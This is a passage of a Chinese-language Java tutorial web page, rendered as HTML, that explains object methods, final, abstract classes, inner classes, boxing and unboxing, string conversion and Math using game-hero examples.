class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> charactor;</span><br><span class="line">  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Hero</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> String name;</span><br><span class="line">    <span class="keyword">protected</span> <span class="type">float</span> hp;</span><br><span class="line">      </span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">toString</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line">     </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">finalize</span><span class="params">()</span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;这个英雄正在被回收&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">      </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="comment">//只有一引用</span></span><br><span class="line">        Hero h;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; <span class="number">100000</span>; i++) &#123;</span><br><span class="line">            <span class="comment">//不断生成新的对象</span></span><br><span class="line">            <span class="comment">//每创建一个对象，前一个对象，就没有引用指向了</span></span><br><span class="line">            <span class="comment">//那些对象，就满足垃圾回收的条件</span></span><br><span class="line">            <span class="comment">//当，垃圾堆积的比较多的时候，就会触发垃圾回收</span></span><br><span class="line">            <span class="comment">//一旦这个对象被回收，它的finalize()方法就会被调用</span></span><br><span class="line">            h = <span class="keyword">new</span> <span class="title class_">Hero</span>();</span><br><span class="line">        &#125;</span><br><span class="line"> </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="equals-用于判断两个对象的内容是否相同">equals() 用于判断两个对象的内容是否相同</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> charactor;</span><br><span class="line">  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Hero</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> String name;</span><br><span class="line">    <span class="keyword">protected</span> <span class="type">float</span> hp;</span><br><span class="line">      </span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">equals</span><span class="params">(Object o)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(o <span class="keyword">instanceof</span> Hero)&#123;</span><br><span class="line">            <span class="type">Hero</span> <span class="variable">h</span> <span class="operator">=</span> (Hero) o;</span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">this</span>.hp == h.hp;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">      </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        Hero h1= <span class="keyword">new</span> <span class="title class_">Hero</span>();</span><br><span class="line">        h1.hp = <span class="number">300</span>;</span><br><span class="line">        Hero h2= <span class="keyword">new</span> <span class="title class_">Hero</span>();</span><br><span class="line">        h2.hp = <span class="number">400</span>;</span><br><span class="line">        Hero h3= <span class="keyword">new</span> <span class="title class_">Hero</span>();</span><br><span class="line">        h3.hp = <span class="number">300</span>;</span><br><span class="line">         </span><br><span class="line">        System.out.println(h1.equals(h2));</span><br><span class="line">        System.out.println(h1.equals(h3));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="">==</h4><p>用于判断两个引用，是否指向了同一个对象</p><h4 id="hashcode">hashcode</h4><p>hashCode方法返回一个对象的哈希值</p><h4 id="final-2">final</h4><p>当Hero被修饰成final的时候，表示Hero不能够被继承</p><p>Hero的useItem方法被修饰成final,那么该方法在ADHero中，不能够被重写</p><p>final修饰基本类型变量，表示该变量只有一次赋值机会</p><p>inal修饰引用<br>h引用被修饰成final，表示该引用只有<strong>1</strong>次指向对象的机会<br>所以17行会出现编译错误<br>但是，依然通过h引用修改对象的属性值hp，因为hp并没有final修饰</p><h4 id="抽象类">抽象类</h4><p>在类中声明一个方法，这个方法没有实现体，是一个“空”方法</p><p>这样的方法就叫抽象方法，使用修饰符“abstract&quot;</p><p>当一个类有抽象方法的时候，该类必须被声明为抽象类</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> charactor;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">abstract</span> <span class="keyword">class</span> <span class="title class_">Hero</span> &#123;</span><br><span class="line">    String name;</span><br><span class="line"> </span><br><span class="line">    <span class="type">float</span> hp;</span><br><span class="line"> </span><br><span class="line">    <span class="type">float</span> armor;</span><br><span class="line"> </span><br><span class="line">    <span class="type">int</span> moveSpeed;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line"> </span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="comment">// 抽象方法attack</span></span><br><span class="line">    <span class="comment">// Hero的子类会被要求实现attack方法</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">abstract</span> <span class="keyword">void</span> <span class="title function_">attack</span><span class="params">()</span>;</span><br><span class="line"> </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> charactor;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ADHero</span> <span class="keyword">extends</span> <span class="title class_">Hero</span> <span class="keyword">implements</span> <span class="title class_">AD</span> &#123;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">physicAttack</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;进行物理攻击&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">attack</span><span class="params">()</span> &#123;</span><br><span class="line">        physicAttack();</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Hero类可以在不提供抽象方法的前提下，声明为抽象类<br>一旦一个类被声明为抽象类，就不能够被直接实例化</p><p>区别1：<br>子类只能继承一个抽象类，不能继承多个<br>子类可以实现<strong>多个</strong>接口<br>区别2：<br>抽象类可以定义<br>public,protected,package,private<br>静态和非静态属性<br>final和非final属性<br>但是接口中声明的属性，只能是<br>public<br>静态<br>final的<br>即便没有显式的声明</p><h4 id="内部类">内部类</h4><p>内部类分为四种：<br>非静态内部类<br>静态内部类<br>匿名类<br>本地类</p><h5 id="非静态内部类">非静态内部类</h5><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> charactor;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Hero</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> String name; <span class="comment">// 姓名</span></span><br><span class="line"> </span><br><span class="line">    <span class="type">float</span> hp; <span class="comment">// 血量</span></span><br><span class="line"> </span><br><span class="line">    <span class="type">float</span> armor; <span class="comment">// 护甲</span></span><br><span class="line"> </span><br><span class="line">    <span class="type">int</span> moveSpeed; <span class="comment">// 移动速度</span></span><br><span class="line"> </span><br><span class="line">    <span class="comment">// 非静态内部类，只有一个外部类对象存在的时候，才有意义</span></span><br><span class="line">    <span class="comment">// 战斗成绩只有在一个英雄对象存在的时候才有意义</span></span><br><span class="line">    <span class="keyword">class</span> <span class="title class_">BattleScore</span> &#123;</span><br><span class="line">        <span class="type">int</span> kill;</span><br><span class="line">        <span class="type">int</span> die;</span><br><span class="line">        <span class="type">int</span> assit;</span><br><span class="line"> </span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">legendary</span><span class="params">()</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (kill &gt;= <span class="number">8</span>)</span><br><span class="line">                System.out.println(name + <span class="string">&quot;超神！&quot;</span>);</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">                System.out.println(name + <span class="string">&quot;尚未超神！&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">Hero</span> <span class="variable">garen</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Hero</span>();</span><br><span class="line">        garen.name = <span class="string">&quot;盖伦&quot;</span>;</span><br><span class="line">        <span class="comment">// 实例化内部类</span></span><br><span class="line">        <span class="comment">// BattleScore对象只有在一个英雄对象存在的时候才有意义</span></span><br><span class="line">        <span class="comment">// 所以其实例化必须建立在一个外部类对象的基础之上</span></span><br><span class="line">        <span class="type">BattleScore</span> <span class="variable">score</span> <span class="operator">=</span> garen.<span class="keyword">new</span> <span class="title class_">BattleScore</span>();</span><br><span class="line">        score.kill = <span class="number">9</span>;</span><br><span class="line">        score.legendary();</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="静态内部类">静态内部类</h5><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> charactor;</span><br><span class="line">  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Hero</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> String name;</span><br><span class="line">    <span class="keyword">protected</span> <span class="type">float</span> hp;</span><br><span class="line">  </span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">battleWin</span><span class="params">()</span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;battle win&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">     </span><br><span class="line">    <span class="comment">//敌方的水晶</span></span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">EnemyCrystal</span>&#123;</span><br><span class="line">        <span class="type">int</span> hp=<span class="number">5000</span>;</span><br><span class="line">         </span><br><span class="line">        <span class="comment">//如果水晶的血量为0，则宣布胜利</span></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">checkIfVictory</span><span class="params">()</span>&#123;</span><br><span class="line">            <span class="keyword">if</span>(hp==<span class="number">0</span>)&#123;</span><br><span class="line">                Hero.battleWin();</span><br><span class="line">                 </span><br><span class="line">                <span class="comment">//静态内部类不能直接访问外部类的对象属性</span></span><br><span class="line">                System.out.println(name + <span class="string">&quot; win this game&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">     </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="comment">//实例化静态内部类</span></span><br><span class="line">        Hero.<span class="type">EnemyCrystal</span> <span class="variable">crystal</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Hero</span>.EnemyCrystal();</span><br><span class="line">        crystal.checkIfVictory();</span><br><span class="line">    &#125;</span><br><span class="line">  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在一个类里面声明一个静态内部类<br>比如敌方水晶，当敌方水晶没有血的时候，己方所有英雄都取得胜利，而不只是某一个具体的英雄取得胜利。<br>与非静态内部类不同，<strong>静态内部类</strong>水晶类的实例化 <strong>不需要一个外部类的实例为基础</strong>，可以直接实例化<br>语法：<strong>new 外部类.静态内部类();</strong><br>因为没有一个外部类的实例，所以在静态内部类里面<strong>不可以访问外部类的实例属性和方法</strong><br>除了可以访问外部类的<strong>私有静态成员外</strong>，静态内部类和普通类没什么大的区别</p><h5 id="匿名类">匿名类</h5><p>匿名类指的是在<strong>声明一个类的同时实例化它</strong>，使代码更加简洁精练<br>通常情况下，要使用一个接口或者抽象类，都必须创建一个子类</p><p>有的时候，为了快速使用，直接实例化一个抽象类，并“<strong>当场</strong>”实现其抽象方法。<br>既然实现了抽象方法，那么就是一个新的类，只是这个类，没有命名。<br>这样的类，叫做匿名类</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> charactor;</span><br><span class="line">   </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">abstract</span> <span class="keyword">class</span> <span class="title class_">Hero</span> &#123;</span><br><span class="line">    String name; <span class="comment">//姓名</span></span><br><span class="line">          </span><br><span class="line">    <span class="type">float</span> hp; <span class="comment">//血量</span></span><br><span class="line">          </span><br><span class="line">    <span class="type">float</span> armor; <span class="comment">//护甲</span></span><br><span class="line">          </span><br><span class="line">    <span class="type">int</span> moveSpeed; <span class="comment">//移动速度</span></span><br><span class="line">      </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">abstract</span> <span class="keyword">void</span> <span class="title function_">attack</span><span class="params">()</span>;</span><br><span class="line">      </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">          </span><br><span class="line">        ADHero adh=<span class="keyword">new</span> <span class="title class_">ADHero</span>();</span><br><span class="line">        <span class="comment">//通过打印adh，可以看到adh这个对象属于ADHero类</span></span><br><span class="line">        adh.attack();</span><br><span class="line">        System.out.println(adh);</span><br><span class="line">          </span><br><span class="line">        <span class="type">Hero</span> <span class="variable">h</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Hero</span>()&#123;</span><br><span class="line">            <span class="comment">//当场实现attack方法</span></span><br><span class="line">            <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">attack</span><span class="params">()</span> &#123;</span><br><span class="line">                System.out.println(<span class="string">&quot;新的进攻手段&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;;</span><br><span class="line">        h.attack();</span><br><span class="line">        <span class="comment">//通过打印h，可以看到h这个对象属于Hero$1这么一个系统自动分配的类名</span></span><br><span class="line">          </span><br><span class="line">        System.out.println(h);</span><br><span class="line">    &#125;</span><br><span class="line">      </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="本地类">本地类</h5><p>本地类可以理解为有名字的匿名类<br>内部类与匿名类不一样的是，内部类必须声明在成员的位置，即与属性和方法平等的位置。<br>本地类和匿名类一样，直接声明在代码块里面，可以是主方法，for循环里等等地方</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> charactor;</span><br><span class="line">   </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">abstract</span> <span class="keyword">class</span> <span class="title class_">Hero</span> &#123;</span><br><span class="line">    String name; <span class="comment">//姓名</span></span><br><span class="line">          </span><br><span class="line">    <span class="type">float</span> hp; <span class="comment">//血量</span></span><br><span class="line">          </span><br><span class="line">    <span class="type">float</span> armor; <span class="comment">//护甲</span></span><br><span class="line">          </span><br><span class="line">    <span class="type">int</span> moveSpeed; <span class="comment">//移动速度</span></span><br><span class="line">      </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">abstract</span> <span class="keyword">void</span> <span class="title function_">attack</span><span class="params">()</span>;</span><br><span class="line">      </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">          </span><br><span class="line">        <span class="comment">//与匿名类的区别在于，本地类有了自定义的类名</span></span><br><span class="line">        <span class="keyword">class</span> <span class="title class_">SomeHero</span> <span class="keyword">extends</span> <span class="title class_">Hero</span>&#123;</span><br><span class="line">            <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">attack</span><span class="params">()</span> &#123;</span><br><span class="line">                System.out.println( name+ <span class="string">&quot; 新的进攻手段&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">         </span><br><span class="line">        <span class="type">SomeHero</span> <span class="variable">h</span>  <span class="operator">=</span><span class="keyword">new</span> <span class="title class_">SomeHero</span>();</span><br><span class="line">        h.name =<span class="string">&quot;地卜师&quot;</span>;</span><br><span class="line">        h.attack();</span><br><span class="line">    &#125;</span><br><span class="line">      </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="默认方法">默认方法</h5><p>默认方法是JDK8新特性，指的是接口也可以提供具体方法了，而不像以前，只能提供抽象方法.</p><h3 id="8-数字和字符串">8.数字和字符串</h3><h4 id="数字封装类">数字封装类</h4><p>数字封装类有<br>Byte,Short,Integer,Long,Float,Double<br>这些类都是抽象类Number的子类</p><p>不需要调用构造方法，<strong>通过=符号****自动</strong>把 基本类型 转换为 类类型 就叫装箱</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> digit;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TestNumber</span> &#123;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">5</span>;</span><br><span class="line"> </span><br><span class="line">        <span class="comment">//基本类型转换成封装类型</span></span><br><span class="line">        <span class="type">Integer</span> <span class="variable">it</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Integer</span>(i);</span><br><span class="line">         </span><br><span class="line">        <span class="comment">//自动转换就叫装箱</span></span><br><span class="line">        <span class="type">Integer</span> <span class="variable">it2</span> <span class="operator">=</span> i;</span><br><span class="line">         </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>不需要调用Integer的intValue方法，通过=就自动转换成int类型，就叫拆箱</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> digit;</span><br><span class="line">  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TestNumber</span> &#123;</span><br><span class="line">  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">5</span>;</span><br><span class="line">  </span><br><span class="line">        <span class="type">Integer</span> <span class="variable">it</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Integer</span>(i);</span><br><span class="line">          </span><br><span class="line">        <span class="comment">//封装类型转换成基本类型</span></span><br><span class="line">        <span class="type">int</span> <span class="variable">i2</span> <span class="operator">=</span> it.intValue();</span><br><span class="line">         </span><br><span class="line">        <span class="comment">//自动转换就叫拆箱</span></span><br><span class="line">        <span class="type">int</span> <span class="variable">i3</span> <span class="operator">=</span> it;</span><br><span class="line">          </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>nt的最大值可以通过其对应的封装类Integer.MAX_VALUE获取</p><h4 id="字符串">字符串</h4><h5 id="数字转字符串：">数字转字符串：</h5><p>方法1： 使用String类的静态方法valueOf<br>方法2： 先把基本类型装箱为对象，然后调用对象的toString</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> digit;</span><br><span class="line">  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TestNumber</span> &#123;</span><br><span class="line">  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">5</span>;</span><br><span class="line">         </span><br><span class="line">        <span class="comment">//方法1</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">str</span> <span class="operator">=</span> String.valueOf(i);</span><br><span class="line">         </span><br><span class="line">        <span class="comment">//方法2</span></span><br><span class="line">        <span class="type">Integer</span> <span class="variable">it</span> <span class="operator">=</span> i;</span><br><span class="line">        <span class="type">String</span> <span class="variable">str2</span> <span class="operator">=</span> it.toString();</span><br><span class="line">         </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="调用Integer的静态方法parseInt">调用Integer的静态方法parseInt</h5><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> digit;</span><br><span class="line">  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TestNumber</span> &#123;</span><br><span class="line">  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line"> </span><br><span class="line">        <span class="type">String</span> <span class="variable">str</span> <span class="operator">=</span> <span class="string">&quot;999&quot;</span>;</span><br><span class="line">         </span><br><span class="line">        <span class="type">int</span> i= Integer.parseInt(str);</span><br><span class="line">         </span><br><span class="line">        System.out.println(i);</span><br><span class="line">         </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="java-lang-Math">java.lang.Math</h4><p>数学方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> digit;</span><br><span class="line">  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TestNumber</span> &#123;</span><br><span class="line">  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">float</span> <span class="variable">f1</span> <span class="operator">=</span> <span class="number">5.4f</span>;</span><br><span class="line">        <span class="type">float</span> <span class="variable">f2</span> <span class="operator">=</span> <span class="number">5.5f</span>;</span><br><span class="line">        <span class="comment">//5.4四舍五入即5</span></span><br><span class="line">        System.out.println(Math.round(f1));</span><br><span class="line">        <span class="comment">//5.5四舍五入即6</span></span><br><span class="line">        System.out.println(Math.round(f2));</span><br><span class="line">         </span><br><span class="line">        <span class="comment">//得到一个0-1之间的随机浮点数（取不到1）</span></span><br><span class="line">        System.out.println(Math.random());</span><br><span class="line">         </span><br><span class="line">        <span class="comment">//得到一个0-10之间的随机整数 （取不到10）</span></span><br><span class="line">        System.out.println((<span class="type">int</span>)( 